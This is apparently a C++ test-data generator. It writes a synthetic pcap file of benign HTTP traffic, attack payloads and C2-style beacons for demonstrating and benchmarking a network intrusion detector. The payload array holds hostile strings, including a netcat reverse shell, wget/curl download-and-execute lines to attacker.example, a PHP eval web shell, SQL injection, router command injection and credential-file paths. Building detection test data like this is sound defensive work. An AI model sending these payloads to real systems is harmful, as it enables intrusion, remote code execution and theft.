/**
 * @file gen_synthetic.cpp
 * @brief Generates a synthetic pcap file with controllable packet content.
 *
 * Writes a mix of benign HTTP-like traffic and packets with injected malicious
 * payloads to a pcap file. Serves two roles in the project:
 *
 *   1. Guaranteed-hit demo: the output is a pcap where you know exactly which
 *      packets should fire alerts. Useful when the real malware capture's
 *      traffic doesn't behave as expected on stage.
 *
 *   2. Benchmark control: fixed packet size distribution and hit rate allow
 *      clean, reproducible throughput charts without variance from capture
 *      content or packet length distribution.
 *
 * Builds raw Ethernet/IPv4/TCP frames by hand (no sockets, no system
 * networking required). IP/TCP checksums are not computed -- pcap replay
 * tools (tcpreplay) don't validate them, and we're only reading the file
 * offline, not replaying it live.
 *
 * Usage:
 *   ./gen_synthetic [output.pcap] [num_benign] [num_malicious] [num_beacon] [beacon_interval_ms]
 * Defaults:
 *   output:              data/synthetic.pcap
 *   num_benign:          10000
 *   num_malicious:       50
 *   num_beacon:          20
 *   beacon_interval_ms:  5000
 *
 * After editing the malicious payload strings to match patterns/rules.txt,
 * run once and commit the output. Or add a make/cmake target that regenerates
 * it automatically before the demo.
 */

#include <arpa/inet.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <pcap.h>

// Raw frame headers. #pragma pack ensures no padding bytes are inserted.
#pragma pack(push, 1)
struct EthHdr {
    uint8_t  dst[6], src[6];
    uint16_t ethertype;
};
struct IpHdr {
    uint8_t  ver_ihl, tos;
    uint16_t total_len, id, frag;
    uint8_t  ttl, proto;
    uint16_t checksum;
    uint32_t src, dst;
};
struct TcpHdr {
    uint16_t sport, dport;
    uint32_t seq, ack;
    uint8_t  data_off, flags;
    uint16_t window, checksum, urg;
};
#pragma pack(pop)

static void emit_packet(pcap_dumper_t* dumper,
                        const char*    payload,
                        size_t         payload_len,
                        uint32_t       src_ip,
                        uint32_t       dst_ip,
                        uint16_t       sport,
                        uint16_t       dport,
                        uint64_t       ts_us) {
    uint8_t buf[4096] = {};
    auto* eth  = reinterpret_cast<EthHdr*>(buf);
    auto* ip   = reinterpret_cast<IpHdr*>(buf + sizeof(EthHdr));
    auto* tcp  = reinterpret_cast<TcpHdr*>(buf + sizeof(EthHdr) + sizeof(IpHdr));
    char* data = reinterpret_cast<char*>(tcp + 1);

    eth->ethertype = htons(0x0800);         // IPv4
    ip->ver_ihl    = 0x45;                  // version=4, IHL=20 bytes
    ip->ttl        = 64;
    ip->proto      = 6;                     // TCP
    ip->src        = src_ip;
    ip->dst        = dst_ip;
    ip->total_len  = htons(sizeof(IpHdr) + sizeof(TcpHdr) + payload_len);
    tcp->sport     = htons(sport);
    tcp->dport     = htons(dport);
    tcp->data_off  = 0x50;                  // 20-byte TCP header
    tcp->flags     = 0x18;                  // PSH + ACK
    std::memcpy(data, payload, payload_len);

    size_t total = sizeof(EthHdr) + sizeof(IpHdr) + sizeof(TcpHdr) + payload_len;
    pcap_pkthdr hdr{};
    hdr.ts.tv_sec  = static_cast<decltype(hdr.ts.tv_sec)>(ts_us / 1000000ULL);
    hdr.ts.tv_usec = static_cast<decltype(hdr.ts.tv_usec)>(ts_us % 1000000ULL);
    hdr.caplen = hdr.len = static_cast<bpf_u_int32>(total);
    pcap_dump(reinterpret_cast<u_char*>(dumper), &hdr, buf);
}

int main(int argc, char** argv) {
    const char* out_path      = argc > 1 ? argv[1] : "data/synthetic.pcap";
    int         num_benign    = argc > 2 ? std::atoi(argv[2]) : 10000;
    int         num_malicious = argc > 3 ? std::atoi(argv[3]) : 50;
    int         num_beacon    = argc > 4 ? std::atoi(argv[4]) : 20;
    int         beacon_ms     = argc > 5 ? std::atoi(argv[5]) : 5000;

    pcap_t*        p = pcap_open_dead(DLT_EN10MB, 65535);
    pcap_dumper_t* d = pcap_dump_open(p, out_path);
    if (!d) {
        std::fprintf(stderr, "Cannot open %s for writing\n", out_path);
        return 1;
    }

    // Timestamp base (microseconds). We keep timestamps monotonic so IATs are well-defined.
    uint64_t ts_us = 1700000000ULL * 1000000ULL;

    // Benign: normal HTTP GET requests from 10.0.0.1
    char buf[512];
    for (int i = 0; i < num_benign; i++) {
        int n = std::snprintf(buf, sizeof(buf),
            "GET /page%d HTTP/1.1\r\nHost: example.com\r\nUser-Agent: curl/7.68\r\n\r\n",
            i);
        emit_packet(d, buf, static_cast<size_t>(n),
            htonl(0x0A000001), htonl(0x0A000002), 12345, 80, ts_us); // 10.0.0.1 -> 10.0.0.2
        ts_us += 1000; // 1 ms spacing
    }

    // Malicious: payloads that match patterns from rules2.txt.
    // Each entry is crafted to trigger one or more rules while still
    // resembling traffic that would plausibly appear in a real capture.
    // Grouped by attack category; rules covered are noted inline.
    const char* payloads[] = {
        // --- Path traversal ---
        // ../../etc/passwd
        "GET /cgi-bin/../../etc/passwd HTTP/1.1\r\nHost: victim.com\r\n\r\n",
        // ../../../windows/win.ini
        "GET /cgi-bin/../../../windows/win.ini HTTP/1.1\r\nHost: victim.com\r\n\r\n",

        // --- PHP web shell / code injection ---
        // <?php  eval(base64_decode
        "POST /upload.php HTTP/1.1\r\nHost: victim.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 46\r\n\r\n<?php eval(base64_decode('aGVsbG8gd29ybGQ=')); ?>",

        // --- XSS ---
        // <script>alert(
        "GET /search?q=<script>alert('XSS')</script> HTTP/1.1\r\nHost: victim.com\r\n\r\n",

        // --- Command execution ---
        // cmd.exe  powershell.exe
        "GET /cgi-bin/test.cgi?cmd=cmd.exe+/c+powershell.exe+-enc+AGkAZAA= HTTP/1.1\r\nHost: victim.com\r\n\r\n",
        // /bin/sh  nc -e
        "GET /cgi-bin/exec.cgi?cmd=/bin/sh+-c+'nc+-e+/bin/sh+10.0.0.99+4444' HTTP/1.1\r\nHost: victim.com\r\n\r\n",
        // WScript.Shell
        "POST /api/run HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 50\r\n\r\nvar s=new ActiveXObject('WScript.Shell');s.Run('cmd');",

        // --- Download cradles ---
        // wget http://
        "POST /api/exec HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 44\r\n\r\ncmd=wget http://attacker.example/payload.sh -O /tmp/p",
        // curl http://
        "POST /api/exec HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 42\r\n\r\ncmd=curl http://attacker.example/payload.sh|sh",

        // --- SQL injection ---
        // SELECT%20FROM  1=1--
        "GET /item?id=1+SELECT%20FROM+users+WHERE+1=1-- HTTP/1.1\r\nHost: victim.com\r\n\r\n",
        // UNION%20SELECT
        "GET /item?id=0+UNION%20SELECT+username,password,3+FROM+accounts-- HTTP/1.1\r\nHost: victim.com\r\n\r\n",
        // sp_configure (SQL Server xp_cmdshell enablement)
        "POST /query HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 58\r\n\r\nEXEC sp_configure 'show advanced options',1;RECONFIGURE;--",

        // --- Credential / token leakage ---
        // PASSWORD=  api_key=
        "POST /login HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 44\r\n\r\nusername=admin&PASSWORD=letmein&api_key=sk-abc123",

        // --- PE header in HTTP (executable download) ---
        // MZ
        "HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\n\r\nMZ\x90\x00\x03\x00",

        // --- Old IE User-Agent (malware faking legacy browser) ---
        // User-Agent: Mozilla/4.0 (compatible; MSIE
        "GET /gate.php HTTP/1.1\r\nHost: malware.example\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n\r\n",

        // --- NetSupport RAT ---
        // NetSupport Manager  /fakeurl.htm  easyas123.tech
        "POST /fakeurl.htm HTTP/1.1\r\nHost: easyas123.tech\r\nUser-Agent: NetSupport Manager/1.3\r\nContent-Length: 0\r\n\r\n",

        // --- IIS / legacy web server exploits ---
        // /iisadmpwd/aexp2.htr  /iisadmpwd/aexp
        "GET /iisadmpwd/aexp2.htr HTTP/1.1\r\nHost: victim.com\r\n\r\n",
        // /administrators.pwd
        "GET /administrators.pwd HTTP/1.1\r\nHost: victim.com\r\n\r\n",
        // /msadc/samples/
        "GET /msadc/samples/selector/showcode.asp HTTP/1.1\r\nHost: victim.com\r\n\r\n",
        // /fpcount.exe
        "GET /scripts/fpcount.exe?Page=/default.htm&Digits=5 HTTP/1.1\r\nHost: victim.com\r\n\r\n",
        // /iissamples/
        "GET /iissamples/default/default.asp HTTP/1.1\r\nHost: victim.com\r\n\r\n",
        // /site/iisamples
        "GET /site/iisamples/browse.asp HTTP/1.1\r\nHost: victim.com\r\n\r\n",

        // --- mstime heap spray (IE exploit) ---
        // mstime_malloc
        "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>mstime_malloc(0x1000);</script>",

        // --- Java deserialization / RCE ---
        // java.lang.Runtime@getRuntime().exec(
        "POST /api/deser HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 46\r\n\r\njava.lang.Runtime@getRuntime().exec('id')",
        // java.lang.ProcessBuilder(
        "POST /api/jndi HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 47\r\n\r\nnew java.lang.ProcessBuilder('/bin/sh','-c','id')",
        // java.io.FileOutputStream  sun.misc.BASE64Decoder
        "POST /api/write HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 92\r\n\r\nnew java.io.FileOutputStream('/tmp/x').write(new sun.misc.BASE64Decoder().decode('aGVsbG8='))",
        // initial-heap-size  max-heap-size  (JVM flag injection via JNDI)
        "GET /jndi:ldap://attacker.example/x?initial-heap-size=512m&max-heap-size=1024m HTTP/1.1\r\nHost: victim.com\r\n\r\n",

        // --- WMI persistence (lateral movement / C2 install) ---
        // __EventFilter  __FilterToConsumerBinding  Win32_LocalTime
        "POST /wmi HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 100\r\n\r\nSELECT * FROM __EventFilter WHERE __FilterToConsumerBinding AND TargetInstance ISA 'Win32_LocalTime'",
        // __InstanceModificationEvent
        "POST /wmi HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 70\r\n\r\nSELECT * FROM  __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'",

        // --- Malware-specific C2 endpoints ---
        // /post.php?referanceMod=  (seen in specific RAT families)
        "POST /post.php?referanceMod=1 HTTP/1.1\r\nHost: malware.example\r\nContent-Length: 0\r\n\r\n",
        // solusvmc-node
        "POST /api/register HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 28\r\n\r\nnode_id=solusvmc-node-00001",

        // --- Router / embedded device exploits ---
        // /cgi-bin/override.cgi
        "GET /cgi-bin/override.cgi?enable=1 HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n",
        // /cgi-bin/fw_sys_up.cgi  (firmware upload trigger)
        "POST /cgi-bin/fw_sys_up.cgi HTTP/1.1\r\nHost: 192.168.1.1\r\nContent-Length: 0\r\n\r\n",
        // /cgi-bin/share_editor.cgi
        "GET /cgi-bin/share_editor.cgi?action=read&path=/etc/passwd HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n",
        // /cgi-bin/switch_boot.cgi
        "GET /cgi-bin/switch_boot.cgi?img=2 HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n",
        // /PMConfig.dat  (config file exfil)
        "GET /PMConfig.dat HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n",
        // /wsman/simple_auth.passwd
        "GET /wsman/simple_auth.passwd HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n",
        // cmi/var/ssh/root/authorized_keys  (SSH key theft on embedded Linux)
        "GET /cmi/var/ssh/root/authorized_keys HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n",
        // /cgi-bin/rtpd.cgi?
        "GET /cgi-bin/rtpd.cgi?action=start&port=9999 HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n",
        // /upnp/asf-mp4.asf  (UPnP buffer overflow)
        "GET /upnp/asf-mp4.asf HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n",
        // /md/lums.cgi
        "GET /md/lums.cgi?action=status HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n",
        // /var/run/.zollard/  (Zollard worm marker)
        "GET /var/run/.zollard/config HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n",
        // /ddnsmngr.cmd?action=apply  &dnsSecondary=  &dnsDynamic=  &dnsRefresh=
        "GET /ddnsmngr.cmd?action=apply&dnsSecondary=8.8.8.8&dnsDynamic=1&dnsRefresh=60 HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n",
        // /dnscfg.cgi?  dnsSecondary=  (DNS hijack)
        "GET /dnscfg.cgi?dnsSecondary=8.8.4.4 HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n",
        // ccp_act=ping_v6&ping_addr=  (command injection via v6 ping field)
        "POST /apply HTTP/1.1\r\nHost: 192.168.1.1\r\nContent-Length: 44\r\n\r\nccp_act=ping_v6&ping_addr=;wget http://attacker.example/p",
        // /fwupgrade.ccp
        "GET /fwupgrade.ccp HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n",
        // /index.php/mv_system/get_general_setup?_=1413463189043
        "GET /index.php/mv_system/get_general_setup?_=1413463189043 HTTP/1.1\r\nHost: victim.com\r\n\r\n",
        // /userRpm/WanDynamicIpCfgRpm.htm?  submit_button=index  &action=Apply
        "GET /userRpm/WanDynamicIpCfgRpm.htm?submit_button=index&action=Apply HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n",
        // /goformFOO/AlFrame?  Gateway.Wan.dnsAddress1=
        "GET /goformFOO/AlFrame?Gateway.Wan.dnsAddress1=8.8.8.8 HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n",
        // /start_apply.htm?
        "GET /start_apply.htm?submit_button=WAN&action=Apply HTTP/1.1\r\nHost: 192.168.1.1\r\n\r\n",

        // --- Printer exploit ---
        // pjl_ready_message=  (HP/JetDirect PJL injection)
        "POST /pjl HTTP/1.1\r\nHost: 192.168.1.100\r\nContent-Length: 37\r\n\r\n@PJL SET pjl_ready_message=HACKED\r\n",

        // --- Browser fingerprinting / exploit kit detection ---
        // misc_addons_detect.hasSilverlight  (EK landing page beacon)
        "POST /gate HTTP/1.1\r\nHost: exploit.example\r\nContent-Length: 44\r\n\r\nmisc_addons_detect.hasSilverlight=1&flash=1",

        // --- JS obfuscation / URL encoding evasion ---
        // .atob(String.fromCharCode(
        "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>eval(.atob(String.fromCharCode(101,118,97,108)));</script>",
        // %6e%61%6d%65%5b  (URL-encoded "name[" — WAF bypass)
        "GET /api?%6e%61%6d%65%5b%5d=admin&pass=x HTTP/1.1\r\nHost: victim.com\r\n\r\n",
        // n%61%6d%65%5b  (partial encode variant)
        "GET /api?n%61%6d%65%5b%5d=root HTTP/1.1\r\nHost: victim.com\r\n\r\n",
        // %6ea%6d%65%5b
        "GET /api?%6ea%6d%65%5b%5d=test HTTP/1.1\r\nHost: victim.com\r\n\r\n",
        // %6e%61m%65%5b
        "GET /api?%6e%61m%65%5b%5d=test HTTP/1.1\r\nHost: victim.com\r\n\r\n",
        // %6e%61%6de%5b
        "GET /api?%6e%61%6de%5b%5d=test HTTP/1.1\r\nHost: victim.com\r\n\r\n",
        // %6e%61%6d%65[  (bracket not encoded)
        "GET /api?%6e%61%6d%65[]=test HTTP/1.1\r\nHost: victim.com\r\n\r\n",
    };
    int npayloads = static_cast<int>(sizeof(payloads) / sizeof(payloads[0]));

    for (int i = 0; i < num_malicious; i++) {
        const char* pl = payloads[i % npayloads];
        emit_packet(d, pl, std::strlen(pl),
            htonl(0x0A000063), htonl(0x0A000002), 23456, 80, ts_us); // 10.0.0.99 -> 10.0.0.2
        ts_us += 2000; // 2 ms spacing
    }

    // Beacon: highly periodic flow to trigger low IAT CV.
    const char* beacon_payload = "PING /beacon HTTP/1.1\r\nHost: c2.example\r\n\r\n";
    for (int i = 0; i < num_beacon; i++) {
        emit_packet(d, beacon_payload, std::strlen(beacon_payload),
            htonl(0x0A000050), htonl(0x0A000002), 34567, 443, ts_us); // 10.0.0.80 -> 10.0.0.2
        ts_us += static_cast<uint64_t>(beacon_ms) * 1000ULL;
    }

    pcap_dump_close(d);
    pcap_close(p);
    std::printf("Wrote %d benign + %d malicious + %d beacon packets to %s\n",
                num_benign, num_malicious, num_beacon, out_path);
    return 0;
}
